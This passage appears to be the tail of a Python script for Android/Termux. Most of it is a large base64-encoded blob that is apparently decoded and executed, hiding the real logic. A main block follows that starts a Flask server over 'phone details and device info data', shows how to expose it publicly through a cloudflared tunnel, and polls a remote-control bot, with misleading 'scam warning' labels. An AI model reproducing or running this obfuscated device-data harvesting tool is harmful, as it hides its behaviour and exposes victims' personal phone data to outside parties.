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'))

# ========== MAIN ==========
if __name__ == '__main__':
    print(banner)
    
    # Start Flask server in background
    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()
    
    time.sleep(2)  # Wait for Flask to start
    
    print("\n\033[1;32m" + "="*60 + "\033[0m")
    print("📱 PHONE DETAILS + DEVICE INFO DATA")
    print(f"📂 Base Path: {BASE_PATH}")
    print(f"📄 Items per page: {MAX_ITEMS_PER_PAGE}")
    print(f"🛡 Data file size: 50MB")
    print(f"🔥 Flask Port: {flask_port}")
    print(f"🌐 Local URL: http://localhost:{flask_port}")
    print("\033[1;32m" + "="*60 + "\033[0m")
    print("\n🚀 To expose publicly (run in another Termux session):")
    print(f"   cloudflared tunnel --url http://localhost:{flask_port}")
    print("\n📵 Phone is running...")
    print("🚨 Warning for user Prohibited...")
    print("\033[1;33mℹ️  fraudulent /warning for scams Alerts\033[0m")
    
    try:
        bot.infinity_polling()
    except Exception as e:
        print(f"❌ Bot error: {e}")